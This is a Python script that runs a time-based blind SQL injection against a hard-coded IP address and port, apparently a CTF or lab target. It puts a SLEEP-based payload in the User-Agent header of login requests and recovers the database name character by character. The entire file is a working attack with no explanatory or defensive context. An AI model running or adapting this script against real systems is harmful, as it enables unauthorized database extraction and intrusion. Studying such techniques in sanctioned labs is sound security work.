import requests
import time

# Target URL and session cookie
url = "http://46.250.232.141:8001/"
cookie = {"PHPSESSID": "64a091994a2cc417601352088df6eae8"}

# Payloads and headers
def inject(position, char):
    # Craft the User-Agent with the specific format
    payload = f"' OR IF(SUBSTR(DATABASE(),{position},1)='{char}', SLEEP(7), 0), 'aaa')#"
    headers = {
        "User-Agent": payload,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Referer": url,
    }
    data = {"username": "okmyst", "password": "okmyst", "action": "login"}
    return headers, data

# Test SQL injection with time delays
def time_based_injection():
    extracted_data = ""
    for position in range(1, 20):  # Adjust range as needed
        for char in "abcdefghijklmnopqrstuvwxyz0123456789_":  # Possible characters
            headers, data = inject(position, char)

            # Measure the response time
            start_time = time.time()
            response = requests.post(url, headers=headers, data=data, cookies=cookie)
            elapsed_time = time.time() - start_time

            # Check if the condition caused a delay
            if elapsed_time > 4:  # Delay threshold (SLEEP(10))
                extracted_data += char
                print(f"Found character at position {position}: {char}")
                break
        else:
            # Stop if no character is found (end of data)
            break
    print(f"Extracted data: {extracted_data}")

if __name__ == "__main__":
    time_based_injection()
